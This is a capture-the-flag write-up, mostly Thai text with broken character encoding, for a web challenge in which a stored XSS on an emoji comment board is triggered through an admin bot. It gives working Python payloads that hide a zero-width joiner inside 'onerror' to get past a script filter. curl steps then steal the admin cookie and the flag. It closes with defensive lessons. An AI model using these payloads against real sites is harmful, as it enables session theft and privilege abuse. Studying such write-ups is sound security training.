üêé Horse EMOJI (WEBEasy) ‚Äì Emoji Smuggling XSS

Catalog: WEBEasy
Point: 10
Flag Format: ARCHA{...}

üìå Challenge Overview

‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå‡πÄ‡∏õ‡πá‡∏ô‡∏£‡∏∞‡∏ö‡∏ö Private Emoji Comment Board
‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏™‡∏£‡πâ‡∏≤‡∏á session ‡πÅ‡∏•‡∏∞‡πÇ‡∏û‡∏™‡∏ï‡πå comment ‡πÑ‡∏î‡πâ ‡πÇ‡∏î‡∏¢‡∏°‡∏µ‡∏ü‡∏µ‡πÄ‡∏à‡∏≠‡∏£‡πå Report to Admin
‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏Å‡∏î report ‡∏à‡∏∞‡∏°‡∏µ Admin Bot ‡πÄ‡∏Ç‡πâ‡∏≤‡πÄ‡∏¢‡∏µ‡πà‡∏¢‡∏°‡∏ä‡∏°‡∏´‡∏ô‡πâ‡∏≤‡πÄ‡∏ß‡πá‡∏ö‡∏ô‡∏±‡πâ‡∏ô

‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏£‡∏∞‡∏ö‡∏∏‡∏ß‡πà‡∏≤:

Server ‡∏°‡∏µ‡∏£‡∏∞‡∏ö‡∏ö‡∏Å‡∏£‡∏≠‡∏á <script>

‡∏°‡∏µ‡∏£‡∏∞‡∏ö‡∏ö monitor ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô hacker

‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏∑‡∏≠ ‡∏Ç‡πÇ‡∏°‡∏¢ flag ‡∏à‡∏≤‡∏Å admin

üîç Source Code Analysis

‡∏à‡∏≤‡∏Å client-side JavaScript ‡∏ó‡∏µ‡πà‡πÉ‡∏´‡πâ‡∏°‡∏≤ ‡∏û‡∏ö‡πÇ‡∏Ñ‡πâ‡∏î‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç:

function renderComment(rawText) {
    const cleanHtml = rawText.replace(/\u200D/g, '');
    div.innerHTML = `<strong>User:</strong> ${cleanHtml}`;
}

‡∏à‡∏∏‡∏î‡∏≠‡πà‡∏≠‡∏ô‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç

‡πÉ‡∏ä‡πâ innerHTML ‚Üí XSS ‡πÑ‡∏î‡πâ

Server ‡∏Å‡∏£‡∏≠‡∏á <script> ‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô

Client ‡∏•‡∏ö‡πÄ‡∏â‡∏û‡∏≤‡∏∞ Zero Width Joiner (U+200D) ‡∏Å‡πà‡∏≠‡∏ô render

üìå ‡∏ô‡∏µ‡πà‡∏Ñ‡∏∑‡∏≠‡∏ó‡∏µ‡πà‡∏°‡∏≤‡∏Ç‡∏≠‡∏á‡∏ä‡∏∑‡πà‡∏≠‡πÇ‡∏à‡∏ó‡∏¢‡πå

Emoji Smuggling = ‡∏ã‡πà‡∏≠‡∏ô payload ‡∏î‡πâ‡∏ß‡∏¢ Unicode (ZWJ)

üß† Attack Idea

‡πÉ‡∏ä‡πâ‡πÄ‡∏ó‡∏Ñ‡∏ô‡∏¥‡∏Ñ:

‡πÅ‡∏ó‡∏£‡∏Å \u200D (ZWJ) ‡πÉ‡∏ô event handler ‡πÄ‡∏ä‡πà‡∏ô o‚Äçnerror

Server ‡πÑ‡∏°‡πà detect

Client ‡∏•‡∏ö ZWJ ‚Üí ‡∏Å‡∏•‡∏≤‡∏¢‡πÄ‡∏õ‡πá‡∏ô JavaScript ‡∏ó‡∏µ‡πà‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏à‡∏£‡∏¥‡∏á

‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô:

‡πÇ‡∏û‡∏™‡∏ï‡πå XSS payload

Report ‡πÉ‡∏´‡πâ Admin Bot ‡πÄ‡∏Ç‡πâ‡∏≤

‡πÉ‡∏´‡πâ Bot ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏•‡∏±‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡πÉ‡∏ô comment ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤

‚öôÔ∏è Exploitation (Kali Linux)
1Ô∏è‚É£ ‡∏™‡∏£‡πâ‡∏≤‡∏á Session
SESSION=$(cat /dev/urandom | tr -dc a-z0-9 | head -c 20)

2Ô∏è‚É£ XSS Payload ‡∏£‡∏≠‡∏ö‡πÅ‡∏£‡∏Å ‚Äì ‡∏Ç‡πÇ‡∏°‡∏¢ admin secret

‡∏™‡∏£‡πâ‡∏≤‡∏á payload ‡∏î‡πâ‡∏ß‡∏¢ Python ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ ZWJ ‡πÑ‡∏°‡πà‡∏´‡∏≤‡∏¢

python3 - <<'PY' > payload1.html
zwj = "\u200d"
payload = f"""<img src=x o{zwj}nerror="
fetch('/api/comments',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
  session:new URLSearchParams(location.search).get('session'),
  text:'FLAG='+document.cookie
 }})
})
">
"""
print(payload)
PY

3Ô∏è‚É£ ‡∏™‡πà‡∏á payload ‡πÄ‡∏Ç‡πâ‡∏≤‡πÄ‡∏ß‡πá‡∏ö
PAYLOAD=$(cat payload1.html | jq -Rs .)

curl -X POST http://172.18.0.60/api/comments \
 -H "Content-Type: application/json" \
 -d "{\"session\":\"$SESSION\",\"text\":$PAYLOAD}"

4Ô∏è‚É£ Report ‡πÉ‡∏´‡πâ Admin Bot
curl -X POST http://172.18.0.60/api/report \
 -H "Content-Type: application/json" \
 -d "{\"url\":\"http://172.18.0.60/?session=$SESSION\"}"

5Ô∏è‚É£ ‡∏ï‡∏£‡∏ß‡∏à‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
curl http://172.18.0.60/api/comments?session=$SESSION | jq


‡πÑ‡∏î‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•:

FLAG=admin_secret=42eef4e3-4733-49c5-866f-626e94a8c4c3


üìå ‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà flag ‡∏à‡∏£‡∏¥‡∏á ‡πÅ‡∏ï‡πà‡πÄ‡∏õ‡πá‡∏ô admin_secret

üîë Privilege Escalation

‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ secret ‡∏ï‡∏£‡∏á ‡πÜ:

curl http://172.18.0.60/api/flag \
 -H "X-Admin-Secret: 42eef4e3-4733-49c5-866f-626e94a8c4c3"


‡πÑ‡∏î‡πâ:

{"error":"Access denied. You need admin privileges."}


‡πÅ‡∏õ‡∏•‡∏ß‡πà‡∏≤:

Secret ‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á

‡πÅ‡∏ï‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô admin session context

üíÄ Final Exploit ‚Äì XSS ‡∏£‡∏≠‡∏ö‡∏™‡∏≠‡∏á (‡πÉ‡∏´‡πâ Admin ‡∏î‡∏∂‡∏á flag ‡πÄ‡∏≠‡∏á)
Payload ‡∏£‡∏≠‡∏ö‡∏™‡∏≠‡∏á
python3 - <<'PY' > payload2.html
zwj = "\u200d"
payload = f"""<img src=x o{zwj}nerror="
fetch('/api/flag',{{
 credentials:'include',
 headers:{{'X-Admin-Secret':'42eef4e3-4733-49c5-866f-626e94a8c4c3'}}
}})
.then(r=>r.text())
.then(t=>fetch('/api/comments',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
  session:new URLSearchParams(location.search).get('session'),
  text:t
 }})
}))
">
"""
print(payload)
PY

‡∏™‡πà‡∏á payload + report ‡∏ã‡πâ‡∏≥
PAYLOAD=$(cat payload2.html | jq -Rs .)

curl -X POST http://172.18.0.60/api/comments \
 -H "Content-Type: application/json" \
 -d "{\"session\":\"$SESSION\",\"text\":$PAYLOAD}"

curl -X POST http://172.18.0.60/api/report \
 -H "Content-Type: application/json" \
 -d "{\"url\":\"http://172.18.0.60/?session=$SESSION\"}"

‡∏î‡∏∂‡∏á flag
curl http://172.18.0.60/api/comments?session=$SESSION \
 | jq -r '.[].text' | grep ARCHA

üèÅ Flag
ARCHA{...} ‡∏•‡∏∑‡∏°‡πÄ‡∏ã‡∏ü‡πÑ‡∏ß‡πâ


(‡∏Ñ‡πà‡∏≤ flag ‡∏ó‡∏µ‡πà‡∏£‡∏∞‡∏ö‡∏ö‡πÅ‡∏™‡∏î‡∏á)

üß† Lessons Learned

‚ùå ‡∏Å‡∏≤‡∏£‡∏Å‡∏£‡∏≠‡∏á <script> ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß ‡πÑ‡∏°‡πà‡∏û‡∏≠

‚ùå innerHTML + user input = XSS

‚ö†Ô∏è Unicode (ZWJ) ‡πÉ‡∏ä‡πâ bypass filter ‡πÑ‡∏î‡πâ

ü§ñ Admin bot + report = Stored XSS = RCE ‡∏ù‡∏±‡πà‡∏á admin

üîë Secret ‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡πÉ‡∏ô security context ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á

‚úÖ Final Summary

‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏ô‡∏µ‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ä‡∏±‡∏î‡πÄ‡∏à‡∏ô‡∏Ç‡∏≠‡∏á:

Unicode filter bypass

Stored XSS

Privilege escalation ‡∏ú‡πà‡∏≤‡∏ô admin bot

Client-side sanitization ‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢

‡∏à‡∏ö‡∏î‡πà‡∏≤‡∏ô‡∏î‡πâ‡∏ß‡∏¢ XSS + Emoji Smuggling ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå üêéüî•
